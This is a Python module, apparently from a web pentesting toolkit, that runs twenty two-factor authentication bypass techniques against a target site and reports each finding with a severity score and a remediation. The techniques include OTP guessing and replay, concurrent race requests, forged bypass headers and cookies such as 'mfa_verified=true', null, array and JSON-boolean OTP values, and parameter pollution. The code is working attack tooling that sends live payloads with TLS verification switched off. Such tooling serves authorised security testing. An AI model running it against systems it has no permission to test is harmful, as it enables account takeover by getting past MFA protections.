#!/usr/bin/env python3
"""
2FA/MFA Bypass Tester — 20 Bypass Techniques
----------------------------------------------
Covers every known real-world bypass method.
"""

import time, threading, requests
from typing import List, Dict, Optional
from rich.console import Console

console = Console()

OTP_PATHS = [
    "/2fa",
    "/mfa",
    "/otp",
    "/verify",
    "/verify-otp",
    "/verify-2fa",
    "/auth/2fa",
    "/auth/otp",
    "/login/2fa",
    "/two-factor",
    "/totp",
]
OTP_FIELDS = [
    "otp",
    "code",
    "token",
    "mfa_code",
    "totp",
    "verification_code",
    "auth_code",
    "two_factor_code",
    "pin",
    "passcode",
]


class MFABypassTester:
    def __init__(
        self,
        target: str,
        session=None,
        timeout: int = 10,
        username: str = "",
        password: str = "",
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.username = username
        self.password = password
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault("User-Agent", "WebPwnToolkit/2.2")
        self.results: List[Dict] = []
        self._url = None
        self._field = "otp"

    def _post(self, url, data, headers=None):
        try:
            return self.session.post(
                url,
                data=data,
                headers=headers or {},
                timeout=self.timeout,
                verify=False,
            )
        except Exception:
            return None

    def _get(self, path):
        try:
            return self.session.get(
                self.target + path,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
        except Exception:
            return None

    def _ok(self, resp, field=None):
        if not resp or resp.status_code not in (200, 302):
            return False
        b = resp.text.lower()
        return not any(
            s in b
            for s in ["invalid", "incorrect", "wrong", "error", "denied", "expired"]
        )

    def _discover(self):
        for path in OTP_PATHS:
            url = self.target + path
            try:
                r = self.session.get(url, timeout=self.timeout, verify=False)
                if r.status_code in (200, 302, 401) and any(
                    k in r.text.lower()
                    for k in ["otp", "code", "verify", "2fa", "totp"]
                ):
                    from bs4 import BeautifulSoup

                    soup = BeautifulSoup(r.text, "lxml")
                    for f in OTP_FIELDS:
                        if soup.find("input", {"name": f}):
                            return url, f
                    return url, "otp"
            except Exception:
                pass
        return None, "otp"

    # ── 1. No 2FA implemented ──────────────────────────────────────────────
    def t01_not_implemented(self) -> Optional[Dict]:
        if not self._url:
            return {
                "url": self.target,
                "type": "2FA — Not Implemented",
                "severity": "medium",
                "cvss": 5.9,
                "detail": "No 2FA/MFA endpoint detected.",
                "evidence": "None of common OTP paths returned OTP form.",
                "owasp": "A07:2021 – Identification and Authentication Failures",
                "remediation": "Implement TOTP-based 2FA (FIDO2/WebAuthn/RFC 6238) for all accounts.",
            }
        return None

    # ── 2. TOTP brute-force (missing rate limit) ───────────────────────────
    def t02_brute_force(self) -> Optional[Dict]:
        codes = ["000000", "123456", "111111", "000001", "999999", "654321", "112233"]
        blocked = None
        for i, code in enumerate(codes):
            r = self._post(self._url, {self._field: code})
            if r and r.status_code in (429, 423, 403):
                blocked = i + 1
                break
            time.sleep(0.05)
        if blocked is None:
            return {
                "url": self._url,
                "type": "2FA — No Rate Limiting on OTP (Brute-force Possible)",
                "severity": "high",
                "cvss": 7.5,
                "detail": f"Tested {len(codes)} OTP codes with no lockout or 429 response.",
                "evidence": f"No rate-limit after {len(codes)} attempts",
                "owasp": "A07:2021 – Identification and Authentication Failures",
                "remediation": "Enforce max 5 attempts. Add exponential backoff and account lockout.",
            }
        return None

    # ── 3. OTP replay / reuse ─────────────────────────────────────────────
    def t03_otp_replay(self) -> Optional[Dict]:
        statuses = []
        for _ in range(3):
            r = self._post(self._url, {self._field: "123456"})
            statuses.append(r.status_code if r else 0)
            time.sleep(0.3)
        if len(set(statuses)) == 1 and statuses[0] == 200:
            return {
                "url": self._url,
                "type": "2FA — OTP Replay Attack Possible",
                "severity": "high",
                "cvss": 7.2,
                "detail": "Same OTP accepted on 3 consecutive requests — no single-use enforcement.",
                "evidence": f"Status codes: {statuses}",
                "owasp": "A07:2021 – Identification and Authentication Failures",
                "remediation": "Invalidate OTP immediately after first use. Track used tokens server-side.",
            }
        return None

    # ── 4. Step skip (forced browsing) ────────────────────────────────────
    def t04_step_skip(self) -> Optional[Dict]:
        for path in [
            "/dashboard",
            "/profile",
            "/account",
            "/home",
            "/api/user",
            "/admin",
        ]:
            r = self._get(path)
            if r and r.status_code == 200:
                b = r.text.lower()
                if not any(
                    s in b for s in ["login", "2fa", "otp", "verify", "sign in"]
                ):
                    return {
                        "url": self.target + path,
                        "type": "2FA — Step Skip (Direct URL Access)",
                        "severity": "critical",
                        "cvss": 9.1,
                        "detail": f"Protected page '{path}' accessible without 2FA completion.",
                        "evidence": f"HTTP 200 on {path} without 2FA session",
                        "owasp": "A01:2021 – Broken Access Control",
                        "remediation": "Enforce 2FA completion check on ALL protected routes via Senior ware.",
                    }
        return None

    # ── 5. Header-based bypass ────────────────────────────────────────────
    def t05_header_bypass(self) -> Optional[Dict]:
        for headers in [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-2FA-Bypass": "true"},
            {"X-MFA-Skip": "1"},
            {"X-Admin": "true"},
            {"X-Override-2FA": "true"},
        ]:
            r = self._post(self._url, {self._field: "000000"}, headers=headers)
            if self._ok(r):
                return {
                    "url": self._url,
                    "type": f"2FA — Header Bypass ({list(headers.keys())[0]})",
                    "severity": "critical",
                    "cvss": 9.8,
                    "detail": f"2FA bypassed via header: {headers}",
                    "evidence": str(headers),
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Never trust client-supplied headers for auth bypass.",
                }
        return None

    # ── 6. Backup code brute-force ────────────────────────────────────────
    def t06_backup_codes(self) -> Optional[Dict]:
        for code in ["000000", "111111", "123456", "12345678", "backup1", "00000000"]:
            r = self._post(self._url, {self._field: code})
            if self._ok(r):
                return {
                    "url": self._url,
                    "type": "2FA — Weak Backup Code Accepted",
                    "severity": "high",
                    "cvss": 8.0,
                    "detail": f"Predictable backup code '{code}' accepted.",
                    "evidence": f"Code '{code}' accepted",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Use cryptographically random backup codes (16+ chars). Single-use only.",
                }
        return None

    # ── 7. Race condition ─────────────────────────────────────────────────
    def t07_race_condition(self) -> Optional[Dict]:
        results = []
        lock = threading.Lock()

        def send():
            r = self._post(self._url, {self._field: "123456"})
            if r:
                with lock:
                    results.append(r.status_code)

        threads = [threading.Thread(target=send) for _ in range(15)]
        [t.start() for t in threads]
        [t.join() for t in threads]
        hits = results.count(200)
        if hits > 3:
            return {
                "url": self._url,
                "type": "2FA — Race Condition on OTP Validation",
                "severity": "high",
                "cvss": 7.8,
                "detail": f"{hits}/15 concurrent requests returned 200 — race condition allows multiple sessions.",
                "evidence": f"200 responses: {hits}/15",
                "owasp": "A07:2021 – Identification and Authentication Failures",
                "remediation": "Use atomic DB transactions. Implement distributed locking (Redis SETNX).",
            }
        return None

    # ── 8. Null / empty OTP ───────────────────────────────────────────────
    def t08_null_otp(self) -> Optional[Dict]:
        for val in ["", "null", "undefined", "None", "0", "false"]:
            r = self._post(self._url, {self._field: val})
            if self._ok(r):
                return {
                    "url": self._url,
                    "type": "2FA — Null/Empty OTP Accepted",
                    "severity": "critical",
                    "cvss": 9.5,
                    "detail": f"OTP value '{val}' was accepted — no validation on empty/null.",
                    "evidence": f"Value '{val}' accepted",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Reject empty, null, or falsy OTP values with strict server-side validation.",
                }
        return None

    # ── 9. Array-based OTP injection ──────────────────────────────────────
    def t09_array_injection(self) -> Optional[Dict]:
        for payload in [
            {self._field: ["123456", "000000"]},
            {self._field + "[]": "123456"},
        ]:
            try:
                r = self.session.post(
                    self._url, data=payload, timeout=self.timeout, verify=False
                )
                if self._ok(r):
                    return {
                        "url": self._url,
                        "type": "2FA — Array/Batch OTP Injection",
                        "severity": "critical",
                        "cvss": 9.0,
                        "detail": f"Array OTP param {payload} accepted — type confusion bypass.",
                        "evidence": str(payload),
                        "owasp": "A07:2021 – Identification and Authentication Failures",
                        "remediation": "Strictly validate OTP field type — must be single string, not array.",
                    }
            except Exception:
                pass
        return None

    # ── 10. HTTP method switch ─────────────────────────────────────────────
    def t10_method_switch(self) -> Optional[Dict]:
        for method in ["GET", "PUT", "PATCH", "DELETE"]:
            try:
                url = f"{self._url}?{self._field}=123456"
                r = self.session.request(
                    method, url, timeout=self.timeout, verify=False
                )
                if self._ok(r):
                    return {
                        "url": self._url,
                        "type": f"2FA — HTTP Method Switch Bypass ({method})",
                        "severity": "high",
                        "cvss": 7.5,
                        "detail": f"2FA endpoint accepts {method} bypassing POST-only validation.",
                        "evidence": f"HTTP {method} → {r.status_code}",
                        "owasp": "A07:2021 – Identification and Authentication Failures",
                        "remediation": "Restrict 2FA endpoint to POST only. Validate HTTP method server-side.",
                    }
            except Exception:
                pass
        return None

    # ── 11. JSON Content-Type bypass ──────────────────────────────────────
    def t11_json_bypass(self) -> Optional[Dict]:
        import json as _json

        try:
            r = self.session.post(
                self._url,
                data=_json.dumps({self._field: True}),
                headers={"Content-Type": "application/json"},
                timeout=self.timeout,
                verify=False,
            )
            if self._ok(r):
                return {
                    "url": self._url,
                    "type": "2FA — JSON Boolean True Bypass",
                    "severity": "critical",
                    "cvss": 9.5,
                    "detail": "OTP field accepts JSON boolean `true` — skips string validation.",
                    "evidence": f'{{"otp": true}} → HTTP {r.status_code}',
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Validate OTP is a numeric string of expected length. Reject boolean types.",
                }
        except Exception:
            pass
        return None

    # ── 12. Parameter pollution ────────────────────────────────────────────
    def t12_param_pollution(self) -> Optional[Dict]:
        try:
            r = self.session.post(
                self._url,
                data=f"{self._field}=000000&{self._field}=123456",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=self.timeout,
                verify=False,
            )
            if self._ok(r):
                return {
                    "url": self._url,
                    "type": "2FA — HTTP Parameter Pollution",
                    "severity": "high",
                    "cvss": 7.8,
                    "detail": "Duplicate OTP parameter accepted — server uses second value bypassing first.",
                    "evidence": f"{self._field}=000000&{self._field}=123456",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Parse only the first occurrence of each parameter. Reject duplicate params.",
                }
        except Exception:
            pass
        return None

    # ── 13. Long OTP (buffer overflow hint) ───────────────────────────────
    def t13_long_otp(self) -> Optional[Dict]:
        for val in ["A" * 1000, "1" * 100, "%00" * 50]:
            r = self._post(self._url, {self._field: val})
            if self._ok(r):
                return {
                    "url": self._url,
                    "type": "2FA — Oversized OTP Accepted",
                    "severity": "high",
                    "cvss": 7.0,
                    "detail": f"OTP field accepts {len(val)}-char input — potential buffer issue or bypass.",
                    "evidence": f"Input length {len(val)} accepted",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Enforce strict length validation (6 digits only). Reject inputs > 8 chars.",
                }
        return None

    # ── 14. Cookie-based 2FA state manipulation ───────────────────────────
    def t14_cookie_manipulation(self) -> Optional[Dict]:
        for name, val in [
            ("mfa_verified", "true"),
            ("2fa_done", "1"),
            ("otp_passed", "true"),
            ("mfa_skip", "1"),
            ("two_factor_verified", "1"),
        ]:
            old = self.session.cookies.get(name)
            self.session.cookies.set(name, val)
            for path in ["/dashboard", "/profile", "/account"]:
                r = self._get(path)
                if r and r.status_code == 200:
                    b = r.text.lower()
                    if not any(s in b for s in ["login", "2fa", "verify"]):
                        return {
                            "url": self.target + path,
                            "type": f"2FA — Cookie Bypass ('{name}={val}')",
                            "severity": "critical",
                            "cvss": 9.8,
                            "detail": f"Setting cookie {name}={val} bypasses 2FA entirely.",
                            "evidence": f"Cookie: {name}={val} → access granted to {path}",
                            "owasp": "A07:2021 – Identification and Authentication Failures",
                            "remediation": "Store 2FA state server-side in session, not in cookies.",
                        }
            if old is None:
                self.session.cookies.clear()
        return None

    # ── 15. Password reset skips 2FA ──────────────────────────────────────
    def t15_password_reset_bypass(self) -> Optional[Dict]:
        for path in [
            "/reset-password",
            "/forgot-password",
            "/password-reset",
            "/api/reset-password",
            "/auth/reset",
        ]:
            r = self._get(path)
            if r and r.status_code == 200:
                b = r.text.lower()
                if "email" in b or "reset" in b:
                    return {
                        "url": self.target + path,
                        "type": "2FA — Password Reset May Bypass 2FA",
                        "severity": "high",
                        "cvss": 7.8,
                        "detail": (
                            f"Password reset endpoint found at {path}. "
                            "If reset flow logs user in without 2FA, it's a bypass vector."
                        ),
                        "evidence": f"Reset endpoint accessible: {path}",
                        "owasp": "A07:2021 – Identification and Authentication Failures",
                        "remediation": "Require 2FA re-verification after password reset before granting session.",
                    }
        return None

    # ── 16. Remember-me / trusted device ─────────────────────────────────
    def t16_remember_me(self) -> Optional[Dict]:
        for name, val in [
            ("remember_me", "1"),
            ("trusted_device", "1"),
            ("remember", "true"),
            ("stay_signed_in", "1"),
        ]:
            self.session.cookies.set(name, val)
            r = self._get("/dashboard")
            if r and r.status_code == 200:
                b = r.text.lower()
                if not any(s in b for s in ["login", "2fa", "verify"]):
                    return {
                        "url": self.target + "/dashboard",
                        "type": f"2FA — Remember-Me Cookie Forgery ('{name}')",
                        "severity": "high",
                        "cvss": 7.5,
                        "detail": f"Forged '{name}={val}' cookie bypasses 2FA for trusted device.",
                        "evidence": f"Cookie: {name}={val}",
                        "owasp": "A07:2021 – Identification and Authentication Failures",
                        "remediation": "Bind trusted device tokens to user+device fingerprint server-side. Sign tokens.",
                    }
        return None

    # ── 17. TOTP time window abuse (allow ±90s) ───────────────────────────
    def t17_time_window(self) -> Optional[Dict]:
        try:
            import pyotp

            now = int(time.time())
            totp = pyotp.TOTP("JBSWY3DPEHPK3PXP")
            codes = [
                totp.at(now - 90),
                totp.at(now - 60),
                totp.at(now + 60),
                totp.at(now + 90),
            ]
            for code in codes:
                r = self._post(self._url, {self._field: code})
                if self._ok(r):
                    return {
                        "url": self._url,
                        "type": "2FA — TOTP Wide Time Window (>30s)",
                        "severity": "medium",
                        "cvss": 5.9,
                        "detail": f"TOTP code from ±90s window accepted. Wide window increases brute-force surface.",
                        "evidence": f"Code from ±90s accepted",
                        "owasp": "A07:2021 – Identification and Authentication Failures",
                        "remediation": "Restrict TOTP window to ±30 seconds (1 step). Use drift compensation.",
                    }
        except ImportError:
            pass
        return None

    # ── 18. OAuth provider skip 2FA ───────────────────────────────────────
    def t18_oauth_bypass(self) -> Optional[Dict]:
        for path in [
            "/auth/google",
            "/auth/github",
            "/oauth/google",
            "/login/google",
            "/sso",
            "/auth/sso",
            "/saml/login",
        ]:
            r = self._get(path)
            if r and r.status_code in (200, 302):
                return {
                    "url": self.target + path,
                    "type": "2FA — OAuth/SSO May Bypass 2FA",
                    "severity": "high",
                    "cvss": 7.8,
                    "detail": (
                        f"OAuth/SSO endpoint at '{path}' may log users in without 2FA. "
                        "Social login commonly bypasses MFA if not explicitly enforced."
                    ),
                    "evidence": f"OAuth endpoint: {path} → HTTP {r.status_code}",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Enforce 2FA for OAuth-authenticated users. Check MFA status post-OAuth login.",
                }
        return None

    # ── 19. Cross-account OTP reuse ───────────────────────────────────────
    def t19_cross_account_reuse(self) -> Optional[Dict]:
        """
        Test if the OTP endpoint associates OTP with a user session or just a global state.
        We test by sending two sequential requests with different session cookies but same OTP.
        This is an approximation — full cross-account test requires two real accounts.
        """
        if not self._url:
            return None

        import uuid

        # Create a second session with a forged/random session cookie
        second_session = __import__("requests").Session()
        second_session.verify = False
        second_session.headers.update(self.session.headers)
        fake_session_id = uuid.uuid4().hex
        second_session.cookies.set("session", fake_session_id)
        second_session.cookies.set("sessionid", fake_session_id)

        # Use same OTP on different session
        try:
            r1 = self._post(self._url, {self._field: "123456"})
            r2 = second_session.post(
                self._url,
                data={self._field: "123456"},
                timeout=self.timeout,
                verify=False,
            )
            if r2 and r2.status_code == 200:
                b = r2.text.lower()
                if not any(
                    s in b
                    for s in ["invalid", "incorrect", "wrong", "denied", "expired"]
                ):
                    return {
                        "url": self._url,
                        "type": "2FA — Possible Cross-Account OTP Reuse",
                        "severity": "high",
                        "cvss": 8.1,
                        "detail": (
                            "A forged session with a different session cookie accepted the same OTP. "
                            "OTP validation may not be tied to user session."
                        ),
                        "evidence": f"HTTP {r2.status_code} returned for forged session with same OTP.",
                        "owasp": "A07:2021 – Identification and Authentication Failures",
                        "remediation": "Bind OTP validation strictly to authenticated user session. OTPs must not work across sessions.",
                    }
        except Exception:
            pass
        return None

    # ── 20. SMS OTP predictability check ─────────────────────────────────
    def t20_sms_predictability(self) -> Optional[Dict]:
        sequential = ["123456", "123457", "123458", "234567", "000001", "000002"]
        for code in sequential:
            r = self._post(self._url, {self._field: code})
            if self._ok(r):
                return {
                    "url": self._url,
                    "type": "2FA — SMS OTP Predictable Sequence",
                    "severity": "critical",
                    "cvss": 9.0,
                    "detail": f"Sequential OTP code '{code}' accepted — codes may not be cryptographically random.",
                    "evidence": f"Sequential code '{code}' accepted",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Use cryptographically secure random OTP generator. Never use sequential codes.",
                }
        return None

    # ── Public run ────────────────────────────────────────────────────────
    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ 2FA/MFA Bypass (20 techniques) on {self.target}[/bold yellow]"
        )

        self._url, self._field = self._discover()

        tests = [
            ("01 Not Implemented", self.t01_not_implemented),
            ("02 TOTP Brute-force", self.t02_brute_force),
            ("03 OTP Replay", self.t03_otp_replay),
            ("04 Step Skip", self.t04_step_skip),
            ("05 Header Bypass", self.t05_header_bypass),
            ("06 Backup Codes", self.t06_backup_codes),
            ("07 Race Condition", self.t07_race_condition),
            ("08 Null/Empty OTP", self.t08_null_otp),
            ("09 Array Injection", self.t09_array_injection),
            ("10 Method Switch", self.t10_method_switch),
            ("11 JSON Boolean True", self.t11_json_bypass),
            ("12 Parameter Pollution", self.t12_param_pollution),
            ("13 Long OTP", self.t13_long_otp),
            ("14 Cookie Manipulation", self.t14_cookie_manipulation),
            ("15 Password Reset Bypass", self.t15_password_reset_bypass),
            ("16 Remember-Me Forgery", self.t16_remember_me),
            ("17 TOTP Time Window", self.t17_time_window),
            ("18 OAuth/SSO Skip", self.t18_oauth_bypass),
            ("19 Cross-Account Reuse", self.t19_cross_account_reuse),
            ("20 SMS Predictability", self.t20_sms_predictability),
        ]

        for name, fn in tests:
            console.print(f"  [dim]Test {name}...[/dim]")
            try:
                result = fn()
                if result:
                    self.results.append(result)
                    console.print(f"  [bold red][!] {result['type']}[/bold red]")
            except Exception as e:
                console.print(f"  [dim]Error in {name}: {e}[/dim]")

        color = "red" if self.results else "green"
        console.print(f"  [{color}]{len(self.results)} 2FA bypass issue(s) found[/]")
        return self.results
